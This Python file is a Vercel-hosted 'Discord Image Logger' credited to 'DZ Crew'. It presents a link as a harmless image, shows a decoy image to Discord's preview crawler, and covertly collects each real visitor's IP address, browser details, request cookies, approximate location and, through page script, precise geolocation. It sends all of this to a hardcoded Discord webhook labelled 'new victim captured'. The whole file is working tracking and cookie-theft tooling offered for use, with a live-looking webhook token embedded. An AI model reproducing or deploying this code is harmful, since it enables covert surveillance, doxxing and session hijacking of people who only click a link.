"""
Discord Image Logger - Vercel Edition (Com Captura de Cookies)
Adaptado por DZ Crew
"""

import json
import base64
import requests
import httpagentparser
from urllib import parse

# ============================================================================
# CONFIGURAÇÃO
# ============================================================================

WEBHOOK_URL = "https://discord.com/api/webhooks/1496179801319538979/VN1XCcqaHxO62SDo41H7vp_bc99A0F_u-coxoc0sxoQd2G3cQyFDlscc4AR3SgdsjdXT"
IMAGE_URL = "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200"

# Configurações
USERNAME = "Image Logger"
COLOR = 0x00FFFF

# ============================================================================
# FUNÇÕES AUXILIARES
# ============================================================================

def get_client_ip(request):
    """Pega o IP real do cliente"""
    x_forwarded_for = request.headers.get('x-forwarded-for')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.remote_addr
    return ip

def get_cookies(request):
    """Pega todos os cookies do navegador"""
    cookie_header = request.headers.get('cookie', '')
    cookies = {}
    
    if cookie_header:
        for item in cookie_header.split(';'):
            item = item.strip()
            if '=' in item:
                key, value = item.split('=', 1)
                cookies[key] = value
    
    return cookies

def send_to_webhook(ip, useragent, cookies, endpoint="/"):
    """Envia os dados para o webhook do Discord"""
    
    # Analisa User-Agent
    try:
        os, browser = httpagentparser.simple_detect(useragent)
    except:
        os = "Desconhecido"
        browser = "Desconhecido"
    
    # Pega informações do IP
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
    except:
        info = {"isp": "Desconhecido", "country": "Desconhecido", "regionName": "Desconhecido", 
                "city": "Desconhecido", "lat": "?", "lon": "?", "proxy": False, "hosting": False}
    
    # Formata cookies para exibição
    cookies_text = json.dumps(cookies, indent=2) if cookies else "Nenhum cookie encontrado"
    
    embed = {
        "username": USERNAME,
        "content": "@everyone",
        "embeds": [
            {
                "title": "🎯 NOVA VÍTIMA CAPTURADA!",
                "color": COLOR,
                "fields": [
                    {"name": "🌐 IP", "value": f"`{ip}`", "inline": True},
                    {"name": "📍 Localização", "value": f"{info.get('city', '?')}, {info.get('regionName', '?')}\n{info.get('country', '?')}", "inline": True},
                    {"name": "🏢 ISP", "value": info.get('isp', 'Desconhecido'), "inline": True},
                    {"name": "📱 Sistema", "value": os, "inline": True},
                    {"name": "🌍 Navegador", "value": browser, "inline": True},
                    {"name": "🛡️ VPN/Proxy", "value": "✅ Sim" if info.get('proxy') else "❌ Não", "inline": True},
                    {"name": "🍪 COOKIES", "value": f"```json\n{cookies_text[:500]}\n```", "inline": False},
                    {"name": "🔗 Endpoint", "value": endpoint, "inline": False}
                ],
                "footer": {"text": "Image Logger - Vercel Edition"}
            }
        ]
    }
    
    try:
        requests.post(WEBHOOK_URL, json=embed, timeout=5)
    except:
        pass

# ============================================================================
# HANDLER PRINCIPAL (Vercel)
# ============================================================================

def handler(request):
    """Função principal que a Vercel vai chamar"""
    
    # Pega dados do cliente
    ip = get_client_ip(request)
    useragent = request.headers.get('user-agent', 'Desconhecido')
    cookies = get_cookies(request)
    endpoint = request.path
    
    # Verifica se é um bot (Discord crawler)
    useragent_lower = useragent.lower()
    is_discord_bot = 'discord' in useragent_lower or 'discordbot' in useragent_lower
    
    if is_discord_bot:
        # Retorna imagem para o Discord (loading image)
        loading_image = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
        
        return {
            "statusCode": 200,
            "headers": {"Content-Type": "image/jpeg"},
            "body": loading_image.decode('latin-1') if isinstance(loading_image, bytes) else str(loading_image),
            "isBase64Encoded": True
        }
    
    # Envia dados para o webhook
    send_to_webhook(ip, useragent, cookies, endpoint)
    
    # Retorna a página HTML com a imagem
    html = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Logger</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }}
        .container {{
            text-align: center;
            padding: 20px;
        }}
        img {{
            max-width: 100%;
            max-height: 80vh;
            border-radius: 10px;
            box-shadow: 0 0 30px rgba(0,0,0,0.5);
        }}
        .loading {{
            color: #fff;
            margin-top: 20px;
            font-size: 14px;
            opacity: 0.7;
        }}
    </style>
</head>
<body>
    <div class="container">
        <img src="{IMAGE_URL}" alt="Image" onerror="this.src='https://via.placeholder.com/800x400?text=Image+Logger'">
        <div class="loading">Carregando...</div>
    </div>
    <script>
        // Captura cookies adicionais via JavaScript
        function getAllCookies() {{
            return document.cookie.split(';').reduce((cookies, cookie) => {{
                const [name, value] = cookie.trim().split('=');
                if (name && value) {{
                    cookies[name] = decodeURIComponent(value);
                }}
                return cookies;
            }}, {{}});
        }}

        // Tenta pegar localização (se o usuário permitir)
        if (navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(function(position) {{
                fetch(window.location.href, {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        lat: position.coords.latitude,
                        lon: position.coords.longitude
                    }})
                }});
            }});
        }}
    </script>
</body>
</html>'''
    
    return {
        "statusCode": 200,
        "headers": {"Content-Type": "text/html"},
        "body": html
    }
